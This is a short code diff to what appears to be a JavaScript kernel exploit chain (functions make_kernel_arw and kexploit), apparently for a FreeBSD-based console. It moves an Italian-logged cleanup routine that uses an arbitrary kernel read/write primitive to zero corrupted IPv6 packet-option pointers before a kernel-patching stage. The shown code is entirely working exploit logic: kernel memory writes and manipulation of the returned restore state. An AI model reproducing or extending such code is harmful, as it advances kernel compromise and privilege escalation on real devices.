@@ -1469,6 +1469,21 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
+try {
+    log("Pulizia puntatori pktopts...");
+    kmem.write64(m_pktopts.add(0x10), 0); // ip6po_pktinfo
+    kmem.write64(m_pktopts.add(0x18), 0); // ip6po_nhinfo
+    kmem.write64(m_pktopts.add(0x68), 0); // ip6po_rthdr
+
+    kmem.write64(w_pktopts.add(0x10), 0);
+    kmem.write64(w_pktopts.add(0x18), 0);
+    kmem.write64(w_pktopts.add(0x68), 0);
+    log("Pulizia completata.");
+} catch (e) {
+    log(`Errore nel pulire i puntatori pktopts: ${e}`);
+}
+
+    
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
@@ -1476,12 +1491,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
-
-
-    return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo, m_pktopts, w_pktopts]];
-
-
     
+    return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
 // FUNCTIONS FOR STAGE: PATCH KERNEL
@@ -1764,8 +1775,6 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-        
-
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
         
@@ -1788,23 +1797,6 @@ export async function kexploit() {
     for (const sd of sds) {
         close(sd);
     }
-
-
-
-    try {
-    log("Pulizia puntatori pktopts...");
-    kmem.write64(m_pktopts.add(0x10), 0); // ip6po_pktinfo
-    kmem.write64(m_pktopts.add(0x18), 0); // ip6po_nhinfo
-    kmem.write64(m_pktopts.add(0x68), 0); // ip6po_rthdr
-
-    kmem.write64(w_pktopts.add(0x10), 0);
-    kmem.write64(w_pktopts.add(0x18), 0);
-    kmem.write64(w_pktopts.add(0x68), 0);
-    log("Pulizia completata.");
-} catch (e) {
-    log(`Errore nel pulire i puntatori pktopts: ${e}`);
-}
- 
 }
 
 
